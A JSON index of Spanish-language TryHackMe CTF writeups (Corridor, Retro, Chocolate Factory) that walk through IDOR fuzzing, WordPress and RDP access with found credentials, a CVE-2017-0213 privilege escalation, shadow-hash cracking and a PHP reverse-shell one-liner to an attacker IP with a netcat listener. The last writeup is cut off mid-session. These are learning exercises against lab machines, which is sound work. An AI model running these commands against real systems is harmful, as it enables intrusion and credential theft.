[ { "title": "Try Hack Me - Corridor - Writeup", "url": "/posts/thm-writeup-corridor/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-10-10 03:30:00 +0100", "snippet": "En esta guía vamos a resolver el room Corridor, una sala sencilla disponible en THM y creada por varios autores en la que practicaremos los rudimentos de IDOR (Insecure Direct Object Reference), un tipo de vulnerabilidad que se produce cuando una aplicación permite al usuario acceder directamente a recursos (archivos, funciones, etc) a través de una consulta implementada sin el necesario control de acceso.Dentro música.IntroducciónLa descripción del room nos dice lo siguiente:Te has encontrado en un pasillo extraño. ¿Puedes encontrar el camino de vuelta al lugar por el que viniste?En este desafío, explorarás las posibles vulnerabilidades de IDOR. Examina los puntos finales de la URL a los que accedes mientras navegas por el sitio web y anota los valores hexadecimales que encuentres (se parecen mucho a un hash, ¿verdad?). Esto podría ayudarle a descubrir ubicaciones del sitio web a las que no se esperaba que accediera.La descripción nos da bastantes pistas (IDOR, URL, valores hexadecimales). Empezamos enumerando con nmap para saber en qué puerto está corriendo el servidor web.Enumeración┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]└─$ nmap -A 10.10.105.230Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 12:32 CESTNmap scan report for 10.10.105.230Host is up (0.037s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION80/tcp open http Werkzeug httpd 2.0.3 (Python 3.10.2)|_http-title: CorridorService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.63 secondsAbrimos un navegador y cargamos la IP.Echamos un ojo al código fuente de la página y vemos que se trata de una imagen mapeada.&lt;img src=\"/static/img/corridor.png\" usemap=\"#image-map\"&gt; &lt;map name=\"image-map\"&gt; &lt;area target=\"\" alt=\"c4ca4238a0b923820dcc509a6f75849b\" title=\"c4ca4238a0b923820dcc509a6f75849b\" href=\"c4ca4238a0b923820dcc509a6f75849b\" coords=\"257,893,258,332,325,351,325,860\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"c81e728d9d4c2f636f067f89cc14862c\" title=\"c81e728d9d4c2f636f067f89cc14862c\" href=\"c81e728d9d4c2f636f067f89cc14862c\" coords=\"469,766,503,747,501,405,474,394\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"eccbc87e4b5ce2fe28308fd9f2a7baf3\" title=\"eccbc87e4b5ce2fe28308fd9f2a7baf3\" href=\"eccbc87e4b5ce2fe28308fd9f2a7baf3\" coords=\"585,698,598,691,593,429,584,421\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"a87ff679a2f3e71d9181a67b7542122c\" title=\"a87ff679a2f3e71d9181a67b7542122c\" href=\"a87ff679a2f3e71d9181a67b7542122c\" coords=\"650,658,644,437,658,652,655,437\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"e4da3b7fbbce2345d7772b0674a318d5\" title=\"e4da3b7fbbce2345d7772b0674a318d5\" href=\"e4da3b7fbbce2345d7772b0674a318d5\" coords=\"692,637,690,455,695,628,695,467\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"1679091c5a880faf6fb5e6087eb1b2dc\" title=\"1679091c5a880faf6fb5e6087eb1b2dc\" href=\"1679091c5a880faf6fb5e6087eb1b2dc\" coords=\"719,620,719,458,728,471,728,609\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"8f14e45fceea167a5a36dedd4bea2543\" title=\"8f14e45fceea167a5a36dedd4bea2543\" href=\"8f14e45fceea167a5a36dedd4bea2543\" coords=\"857,612,933,610,936,456,852,455\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"c9f0f895fb98ab9159f51fd0297e236d\" title=\"c9f0f895fb98ab9159f51fd0297e236d\" href=\"c9f0f895fb98ab9159f51fd0297e236d\" coords=\"1475,857,1473,354,1537,335,1541,901\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"45c48cce2e2d7fbdea1afc51c7c6ad26\" title=\"45c48cce2e2d7fbdea1afc51c7c6ad26\" href=\"45c48cce2e2d7fbdea1afc51c7c6ad26\" coords=\"1324,766,1300,752,1303,401,1325,397\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"d3d9446802a44259755d38e6d163e820\" title=\"d3d9446802a44259755d38e6d163e820\" href=\"d3d9446802a44259755d38e6d163e820\" coords=\"1202,695,1217,704,1222,423,1203,423\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"6512bd43d9caa6e02c990b0a82652dca\" title=\"6512bd43d9caa6e02c990b0a82652dca\" href=\"6512bd43d9caa6e02c990b0a82652dca\" coords=\"1154,668,1146,661,1144,442,1157,442\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"c20ad4d76fe97759aa27a0c99bff6710\" title=\"c20ad4d76fe97759aa27a0c99bff6710\" href=\"c20ad4d76fe97759aa27a0c99bff6710\" coords=\"1105,628,1116,633,1113,447,1102,447\" shape=\"poly\"&gt; &lt;area target=\"\" alt=\"c51ce410c124a10e0db5e4b97fc2af39\" title=\"c51ce410c124a10e0db5e4b97fc2af39\" href=\"c51ce410c124a10e0db5e4b97fc2af39\" coords=\"1073,609,1081,620,1082,459,1073,463\" shape=\"poly\"&gt; &lt;/map&gt;Si hacemos click en cada una de las puertas nos carga la vista de una especie de habitación vacía.Teniendo en cuenta el formato de la cadena y la descripción del room inferimos que puede tratarse de un hash. Tiramos de Crackstation pasándole la lista de hashes a ver qué nos dice.OK, cada una de las cadenas es un hash md5 de los números 1 a 13, uno por cada puerta.El siguiente paso es intentar pasar otros valores hasheados como parámetro al servidor (el principio detrás de una vulnerabilidad de tipo IDOR) y ver qué nos responde. Vamos a probar con el hash md5 correspondiente al número 14. Para calcularlo podemos utilizar la línea de comando (echo -n 14 | md5sum) o cualquier conversor online como ésteLa URL correspondiente al valor 14 nos quedaría así:http://10.10.105.230/aab3238922bcc25a6f606eb525ffdc56Probamos y el servidor nos devuelve un 404.Bien. Aquí se abre un mundo de posibilidades. Qué valores es necesario pasar como parámetro para obtener una respuesta válida ? Vamos probando valores de manera manual ? Qué tipos de valores ? Hasheamos un diccionario ? Creamos el nuestro ?Tomando como referencia lo que sabemos, y por comenzar en alguna dirección, vamos a probar a fuzzear la URL pasándole valores númericos hasheados con md5 desde un diccionario creado por nosotros mismos … y ver qué pasa.Para ello, lo primero es crear nuestro diccionario. En mi caso utilizo el siguiente script en PHP para resolver la tarea.&lt;?php$archivo = fopen(\"md5list.txt\", \"w\") or die(\"Se produjo un error al crear el archivo\");for ($i = -30; $i &lt;= 30; $i++) {\tif ($i &lt; 2 || $i &gt; 13) fwrite($archivo, md5($i) . PHP_EOL);}fclose($archivo);?&gt;Qué estamos haciendo aquí ? Creamos un fichero en modo escritura (w) con el nombre md5list.txt. En un bucle for recorremos los enteros desde el valor -30 a 30. Excluimos mediante la sentencia if los valores del 2 al 13 que ya conocemos (en mi caso he dejado el 1 a modo de control) y escribimos en el archivo el valor md5 correspondiente en una línea nueva. Cerramos el fichero que hemos creado y escrito.Guardamos el código anterior en un fichero con el nombre listgen.php y lo corremos desde el terminal.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]└─$ php -f listgen.phpConfirmamos que esta todo OK.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]└─$ cat md5list.txt8c5ef576c66349bb871d35994ec50448b9ea889c6fc3fb2b4c343d740073485674c803ab28302f53009c2208e8c209367ab4babdd6b87640e9ccccf7055324cb55ef51c35b7e218b34dd47605cfe5d6a0f4b2d50114d8d93c99bf321b2ea122066d8c0f4ab3c3681ff3f9093b05136a64e1ed310e8b3553d266bd619949ec01c29fe3cef22985ae07803bf456b8947dcfe9bea92980bb30c7fb9cc3c33c992041b0fd9efa5279c4203b7c70233f86dbf252e691406782824eec43d7eadc3d256a8d2ec85eaf98407310b72eb73dda24774687a12d3915d3c4d83f1af7b3683d5596a3d04481816330f07e4f97510c28f47c1b025fa18ea96c33fbb6718688c0f0267aaf632e87a63288a08331f22c7c3b3149ecea4628efd23d2f86e5a7234725d7b9adcbe1c629ec722529dd12e51296bb61e3b7bce0931da574d19d1d82c88cfcd208495d565ef66e7dff9f98764dac4ca4238a0b923820dcc509a6f75849baab3238922bcc25a6f606eb525ffdc569bf31c7ff062936a96d3c8bd1f8f2ff3c74d97b01eae257e44aa9d5bade97baf70efdf2ec9b086079795c442636b55fb6f4922f45568161a8cdf4ad2299f6d231f0e3dad99908345f7439f8ffabdffc498f13708210194c475687be6106a3b84Con nuestro diccionario disponible procedemos a fuzzear la URL.Probamos con feroxbuster filtrando las respuestas por el código 200 del servidor.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]└─$ feroxbuster -u http://10.10.105.230/ -w md5list.txt --status-codes 200 ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher 🤓 ver: 2.7.1───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.105.230/ 🚀 Threads │ 50 📖 Wordlist │ md5list.txt 👌 Status Codes │ [200] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200 GET 36l 122w 3213c http://10.10.105.230/200 GET 24l 33w 632c http://10.10.105.230/c4ca4238a0b923820dcc509a6f75849b200 GET 34l 47w 797c http://10.10.105.230/&lt;EDITADO&gt;[####################] - 0s 30/30 0s found:3 errors:0 [####################] - 0s 30/30 77/s http://10.10.105.230/El primer valor (c4ca4238a0b923820dcc509a6f75849b) se corresponde con el hash md5 del valor 1 que incluimos en el diccionario como control. El otro es nuevo, y toca probar ;)Otra posibilidad es utilizar ffuf. Os copio debajo el comando y la salida, si bien el resultado es el mismo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]└─$ ffuf -u http://10.10.105.230/FUZZ -w md5list.txt -c -t 100 -mc 200 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3________________________________________________ :: Method : GET :: URL : http://10.10.105.230/FUZZ :: Wordlist : FUZZ: md5list.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200________________________________________________&lt;EDITADO&gt; [Status: 200, Size: 797, Words: 121, Lines: 34, Duration: 649ms]c4ca4238a0b923820dcc509a6f75849b [Status: 200, Size: 632, Words: 72, Lines: 24, Duration: 728ms]Cargamos la URL con el hash obtenido y accedemos al flag.Espero que os haya resultado útil.Un saludo y manteneros curiosos." }, { "title": "Try Hack Me - Retro - Writeup", "url": "/posts/thm-writeup-retro/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-09-29 03:30:00 +0100", "snippet": "En esta guía vamos a resolver el room Retro, una sala de dificultad Alta disponible en THM y creada por DarkStar7471.Dentro música.EnumeraciónEn la descripción el autor nos informa que la máquina no responde a ping. Atentos a ello lanzamos un nmap básico con la flag -Pn.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]└─$ nmap -Pn 10.10.30.226Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 10:04 CESTNmap scan report for 10.10.30.226Host is up (0.036s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE80/tcp open http3389/tcp open ms-wbt-serverTenemos dos puertos escuchando: 80/tcp: con un servicio http detrás. 3389/tcp: con un servicio ms-wbt-server detrás.Vamos a ello.HTTPArrancamos con el http y escaneamos directorios con gobuster.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]└─$ gobuster dir -u http://10.10.30.226 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.30.226[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/09/29 10:10:42 Starting gobuster in directory enumeration mode===============================================================/&lt;EDITADO&gt; (Status: 301) [Size: 149] [--&gt; http://10.10.30.226/&lt;EDITADO&gt;/]/&lt;EDITADO&gt; (Status: 301) [Size: 149] [--&gt; http://10.10.30.226/&lt;EDITADO&gt;/][...]Con esto podemos responder al primer desafío.Nos vamos al navegador y cargamos http://10.10.30.226/&lt;EDITADO&gt;/Según parece tenemos un primer nombre de usuario: Wade.Trasteamos con la web, nos leemos los posts, probamos a dejar una respuesta … y damos con ésto:Nuestro amigo Wade se ha dejado un recordatorio con info interesante.Pero no acaba aquí la cosa. Dentro de los links del apartado META hay uno especialmente goloso. Le damos y se nos carga la siguiente página.Probamos con las credenciales que hemos conseguido (Wade:parzival) y accedemos al dashboard de Wordpress.Desde este punto podemos intentar cargar una shell reversa en PHP en alguna de las páginas del site para conectarnos contra nuestro equipo. En mi caso, decidí frenar aquí y ver qué da de sí el otro puerto abierto.RDPLanzamos un escaneo utilizando los oportunos scripts de nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]└─$ nmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 10.10.30.226Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 10:09 CESTNmap scan report for 10.10.30.226Host is up (0.036s latency).PORT STATE SERVICE3389/tcp open ms-wbt-server| rdp-ntlm-info:| Target_Name: RETROWEB| NetBIOS_Domain_Name: RETROWEB| NetBIOS_Computer_Name: RETROWEB| DNS_Domain_Name: RetroWeb| DNS_Computer_Name: RetroWeb| Product_Version: 10.0.14393|_ System_Time: 2022-09-29T08:09:48+00:00| rdp-enum-encryption:| Security layer| CredSSP (NLA): SUCCESS| CredSSP with Early User Auth: SUCCESS|_ RDSTLS: SUCCESSNmap done: 1 IP address (1 host up) scanned in 2.21 secondsBien, probamos a conectarnos via RDP con xfreerdp y las credenciales de que disponemos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]└─$ xfreerdp /u:Wade /p:parzival /v:10.10.30.226 /w:800 /h:600OK, estamos dentro, y en el escritorio nos aparece un fichero con la flag correspondiente al usuario.A partir de este punto confieso que me tiré un buen rato trasteando y probando cosas, todas sin éxito :(Finalmente encontré el modo de avanzar aquí. Por lo visto, la versión del sistema operativo del servidor tiene una vulneravilidad conocida CVE-2017-0213 que podemos aprovechar utilizando el fichero CVE-2017-0213_x64.zip disponible aquí.Lo descargamos a nuestro directorio de trabajo e iniciamos un servicio HTTP con python3 para poderlo traspasar a la máquina objetivo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]└─$ wget https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip--2022-09-29 18:53:18-- https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zipResolving github.com (github.com)... 140.82.121.3Connecting to github.com (github.com)|140.82.121.3|:443... connected.HTTP request sent, awaiting response... 302 FoundLocation: https://raw.githubusercontent.com/WindowsExploits/Exploits/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip [following]--2022-09-29 18:53:18-- https://raw.githubusercontent.com/WindowsExploits/Exploits/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zipResolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 83287 (81K) [application/zip]Saving to: 'CVE-2017-0213_x64.zip'CVE-2017-0213_x64.zip 100%[===================================================================================&gt;] 81.33K --.-KB/s in 0.01s 2022-09-29 18:53:18 (5.93 MB/s) - 'CVE-2017-0213_x64.zip' saved [83287/83287]┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]└─$ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...En el equipo remoto abrimos Chrome y descargamos el .zip atacando a nuestra máquina.Nos vamos a la carpeta de Descargas, abrimos el zip y ejecutamos.Se nos abre un cmd con privilegios de Administrador.Confirmamos y nos movemos al Escritorio del Administrador.Hemos conseguido la flag de root.Espero os hayan resultado útiles éstas notas.Sed curiosos." }, { "title": "Try Hack Me - Chocolate Factory - Writeup", "url": "/posts/thm-writeup-chocolatefactory/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-09-27 03:30:00 +0100", "snippet": "En esta guía vamos a resolver el room Chocolate Factory de THM creado por AndyInfosec en el que aplicaremos técnicas de enumeración, estenografía, escalado de privilegios y otras curiosidades.Dentro música.InicioLa descripción disponible en el room, en principio, no aporta gran información, así que iniciamos la máquina y enumeramos con nmap.EnumeraciónTeniendo en cuenta que se trata de un room sencillo lanzamos un nmap básico, que se ejecutará rápido, para ver qué datos obtenemos. De quedarnos cortos, en pasos posteriores podremos lanzar un escaneo de mayor calado.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ nmap -Pn 10.10.31.2Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 09:31 CESTNmap scan report for 10.10.31.2Host is up (0.078s latency).Not shown: 989 closed tcp ports (conn-refused)PORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open http100/tcp open newacct106/tcp open pop3pw109/tcp open pop2110/tcp open pop3111/tcp open rpcbind113/tcp open ident119/tcp open nntp125/tcp open locus-mapNmap done: 1 IP address (1 host up) scanned in 1.30 secondsDel volcado de nmap nos centramos en los puertos básicos: 21/tcp: con un servicio ftp detrás. 22/tcp: con un servicio ssh detrás. 80/tcp: con un servicio http detrás.Tenemos dos líneas de trabajo para empezar: el servicio ftp y el servicio http.Arrancamos con el ftp.FTPEnumeramos con más detalle este puerto con nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ nmap -sC -sV -p 21 10.10.31.2Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 10:56 CESTNmap scan report for 10.10.31.2Host is up (0.059s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.18.xx.xx| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum_room.jpgService Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 2.97 secondsOK. Tenemos ftp-anon: Anonymous FTP login allowed (FTP code 230) y un fichero .jpg disponible. Vamos a ver qué podemos sacar.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ ftp 10.10.31.2Connected to 10.10.31.2.220 (vsFTPd 3.0.3)Name (10.10.31.2:oliverio): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||58018|)150 Here comes the directory listing.-rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum_room.jpg226 Directory send OK.ftp&gt; get gum_room.jpglocal: gum_room.jpg remote: gum_room.jpg229 Entering Extended Passive Mode (|||57566|)150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).100% |*************************************************************************************************************************| 203 KiB 696.87 KiB/s 00:00 ETA226 Transfer complete.208838 bytes received in 00:00 (515.08 KiB/s)ftp&gt;Con el fichero en local tiramos de steghide, una aplicación de estenografía que nos permite extraer, de haberla, información oculta en un fichero de imagen como es nuestro caso.Lo primero, chequeamos si el fichero en cuestión tiene algo embebido.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ steghide info gum_room.jpg \"gum_room.jpg\": format: jpeg capacity: 10.9 KBTry to get information about embedded data ? (y/n) yEnter passphrase: embedded file \"b64.txt\": size: 2.5 KB encrypted: rijndael-128, cbc compressed: yesVamos bien, tenemos algo. Utilizamos steghide para extraerlo.Spoiler: nos pide una frase de paso, le damos a ENTER dado que no tenemos nada parecido.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ steghide extract -sf gum_room.jpgEnter passphrase:wrote extracted data to \"b64.txt\".OK. Hemos conseguido extraer el fichero con el nombre 64.txt que se encontraba oculto en la imagen. Lo abrimos pasando la salida a Base64.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ cat b64.txt | base64 -ddaemon:*:18380:0:99999:7:::bin:*:18380:0:99999:7:::sys:*:18380:0:99999:7:::sync:*:18380:0:99999:7:::games:*:18380:0:99999:7:::[...]statd:*:18451:0:99999:7:::_gvm:*:18496:0:99999:7:::charlie:$6$CZJn&lt;EDITADO&gt;999:7:::Bien, se trata de una copia del fichero /etc/shadow. Copiamos la clave correspondiente al usuario charlie en un fichero con el nombre charly.txt y lo guardamos en nuestro directorio de trabajo para atacarlo con nuestro amigo John the Ripper. Tip: Tened la precaución de copiar la línea completa, desde charlie hasta 7::: Tip 2: Tened paciencia, tarda lo suyo en devolvernos el resultado.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ john charly.txt --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])Cost 1 (iteration count) is 5000 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status0g 0:00:02:07 0.88% (ETA: 13:42:55) 0g/s 1172p/s 1172c/s 1172C/s ilovelloyd..harun0g 0:00:03:55 1.61% (ETA: 13:44:39) 0g/s 1152p/s 1152c/s 1152C/s ishii..iluvdre0g 0:00:06:42 2.77% (ETA: 13:43:09) 0g/s 1148p/s 1148c/s 1148C/s teamoda..tati20080g 0:00:07:27 3.08% (ETA: 13:43:08) 0g/s 1144p/s 1144c/s 1144C/s fuckdude..frenchclass0g 0:00:07:44 3.19% (ETA: 13:43:50) 0g/s 1138p/s 1138c/s 1138C/s bloomer1..blaine080g 0:00:10:21 4.24% (ETA: 13:45:28) 0g/s 1123p/s 1123c/s 1123C/s andre34..anabel13&lt;EDITADO&gt; (charlie)1g 0:00:14:52 DONE (2022-09-27 09:56) 0.001120g/s 1102p/s 1102c/s 1102C/s cocker6..cn123Use the \"--show\" option to display all of the cracked passwords reliablySession completed.john nos devuelve la contraseña del usuario charlie con lo que tenemos resuelto el segundo desafío del room (What is Charlie’s password?).Recordando que tenemos el puerto ssh probamos a ver si hay suerte utilizando estas credenciales.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ ssh charlie@10.10.31.2charlie@10.10.31.2's password: Permission denied, please try again.No tira :(. Toca abrir la segunda linea de trabajo: el puerto http.HTTPAbrimos navegador y cargamos IP.Probamos con las credenciales que hemos obtenido y entramos.Miel sobre hojuelas. Lanzamos un ls a ver qué nos devuelve.En el listado nos aparece el fichero key_rev_key.Lanzamos un comando cat key_rev_key.Probamos con strings key_rev_key.Mirad con atención que hay una de las flags allí (Enter the key you found!).Visto lo anterior, vamos a ejecutar una shell reversa basada en php. Yo utilicé la siguiente:php -r '$sock=fsockopen(\"10.18.xx.xx\",4321);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'Abrimos un nuevo Terminal y ponemos a escuchar netcat.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ nc -lvnp 4321Copiamos el comando de php en la caja y le damos a Execute …┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ nc -lvnp 4321listening on [any] 4321 ...connect to [10.18.xx.xx] from (UNKNOWN) [10.10.31.2] 54208/bin/sh: 0: can't access tty; job control turned off$ Bingo, estamos dentro. Toca trastear. Lo primero es upgradear la shell.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ nc -lvnp 4321listening on [any] 4321 ...connect to [10.18.xx.xx] from (UNKNOWN) [10.10.31.2] 54208/bin/sh: 0: can't access tty; job control turned off$ script -qc /bin/bash /dev/nullTo run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.www-data@chocolate-factory:/var/www/html$ Listamos y abrimos validate.php a ver si nos ofrece algo.www-data@chocolate-factory:/var/www/html$ lslshome.jpg image.png index.php.bak validate.phphome.php index.html key_rev_keywww-data@chocolate-factory:/var/www/html$ cat validate.phpcat validate.php&lt;?php $uname=$_POST['uname']; $password=$_POST['password']; if($uname==\"charlie\" &amp;&amp; $password==\"&lt;EDITADO&gt;\"){ echo \"&lt;script&gt;window.location='home.php'&lt;/script&gt;\"; } else{ echo \"&lt;script&gt;alert('Incorrect Credentials');&lt;/script&gt;\"; echo \"&lt;script&gt;window.location='index.html'&lt;/script&gt;\"; }?&gt;www-data@chocolate-factory:/var/www/html$ La password de chralie, nada nuevo. Nos movemos …www-data@chocolate-factory:/var/www/html$ cd /homecd /homewww-data@chocolate-factory:/home$ ls -lals -latotal 12drwxr-xr-x 3 root root 4096 Oct 1 2020 .drwxr-xr-x 24 root root 4096 Sep 1 2020 ..drwxr-xr-x 5 charlie charley 4096 Oct 7 2020 charliewww-data@chocolate-factory:/home$ cd charliecd charliewww-data@chocolate-factory:/home/charlie$ ls -lals -latotal 40drwxr-xr-x 5 charlie charley 4096 Oct 7 2020 .drwxr-xr-x 3 root root 4096 Oct 1 2020 ..-rw-r--r-- 1 charlie charley 3771 Apr 4 2018 .bashrcdrwx------ 2 charlie charley 4096 Sep 1 2020 .cachedrwx------ 3 charlie charley 4096 Sep 1 2020 .gnupgdrwxrwxr-x 3 charlie charley 4096 Sep 29 2020 .local-rw-r--r-- 1 charlie charley 807 Apr 4 2018 .profile-rw-r--r-- 1 charlie charley 1675 Oct 6 2020 teleport-rw-r--r-- 1 charlie charley 407 Oct 6 2020 teleport.pub-rw-r----- 1 charlie charley 39 Oct 6 2020 user.txtwww-data@chocolate-factory:/home/charlie$ cat user.txtcat user.txtcat: user.txt: Permission deniedwww-data@chocolate-factory:/home/charlie$ El usuario que tenemos, www-data, no tiene permisos. Probamos con los otros ficheros.www-data@chocolate-factory:/home/charlie$ cat teleportcat teleport-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUbL4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj[...]Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkMQxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQmG2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln-----END RSA PRIVATE KEY-----www-data@chocolate-factory:/home/charlie$ OK, tenemos la clave RSA privada. La copiamos completa a un fichero en local, lo guardamos en nuestro directorio de trabajo como id_rsa y le ajustamos los permisos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ chmod 600 id_rsaUna vez hecho, abrimos un nuevo terminal y probamos a acceder por ssh utilizando esta clave.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]└─$ ssh -i id_rsa charlie@10.10.31.2The authenticity of host '10.10.31.2 (10.10.31.2)' can't be established.ED25519 key fingerprint is SHA256:WwycVD8zBUVfJS6sNVj192MU3Q7P4rylVnanjGx/Q5U.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.31.2' (ED25519) to the list of known hosts.Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Sep 27 07:56:10 UTC 2022 System load: 0.08 Processes: 605 Usage of /: 43.6% of 8.79GB Users logged in: 0 Memory usage: 60% IP address for eth0: 10.10.31.2 Swap usage: 0%0 packages can be updated.0 updates are security updates.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.Last login: Wed Oct 7 16:10:44 2020 from 10.0.2.5Could not chdir to home directory /home/charley: No such file or directoryTo run a command as administrator (user \"root\"), use \"sudo 